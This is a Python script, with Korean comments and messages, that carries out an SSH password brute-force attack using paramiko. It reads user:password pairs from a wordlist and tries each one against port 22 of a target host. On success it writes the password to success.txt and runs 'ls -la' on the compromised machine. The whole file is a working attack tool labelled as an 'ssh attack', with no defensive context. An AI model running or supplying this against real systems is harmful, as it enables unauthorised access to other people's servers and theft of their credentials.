from multiprocessing.dummy.connection import families
import paramiko
from paramiko import SSHClient, AutoAddPolicy
import logging
import time
import getpass

paramiko.util.log_to_file("filename9.log")
logging.raiseExceptions=False

ssh = paramiko.SSHClient()
ssh.set_missing_host_key_policy(AutoAddPolicy())

def main(server,user,password,passwdFile):
    print('\n\n< ssh 공격을 시작합니다 >\n')
    if server == '':
        server = input("호스트 입력 : ")
    if user == '' or password == '':
        if passwdFile == '':
            passwdFile = input('패스워드 파일 입력 (.txt) : ')
            wordlist = open(passwdFile, 'r')
        passwords = wordlist.readlines()
        print()
        cnt = 0
    #pwd = getpass.getpass("Password : ")
        for psword in passwords:
            # psword = psword.strip('\n')
            user = psword.split(':')[0]
            psword = psword.split(':')[1].strip('\r').strip('\n')
            try: # ssh 시도
                idx = ssh.connect(server, port=22, username=user, password=psword)
            except: # 오류 발생
                idx = 0

            if idx is None: # ssh 로그인 성공시
                # print(ssh, type(ssh), 'success',psword)
                print('\n* '+user+' 계정에 대한 ssh 로그인이 성공하였습니다 *\n* 패스워드는 '+psword+' 입니다 *\n')
                f = open("success.txt", 'w')
                f.write(psword)
                f.close()
                stdin, stdout, stderr = ssh.exec_command("ls -la")
                lines=stdout.readlines()
                print("".join(lines)) 
                return user, password
            else: # ssh 실패
                print('<실패>', user+':'+psword)
                cnt += 1
                time.sleep(0.3)
            if cnt == len(passwords):
                print(' => ssh 공격이 실패하였습니다.')
                return False
        
            ssh.close()
        wordlist.close()
    else: # password가 있을 경우
        try: # ssh 로그인 시도
            idx = ssh.connect(server, port=22, username=user, password=password)
            print('\n* '+user+' 계정에 대한 ssh 로그인이 성공하였습니다 *\n* 패스워드는 '+password+' 입니다 *\n')
            f = open("success.txt", 'w')
            f.write(password)
            f.close()
            stdin, stdout, stderr = ssh.exec_command("ls -la")
            lines=stdout.readlines()
            print("".join(lines))
            return user, password
        except: # ssh 로그인 오류 발생시
            print(' => ssh 공격을 실패하였습니다.')
            return False
# if __name__ == "__main__":
#     main()
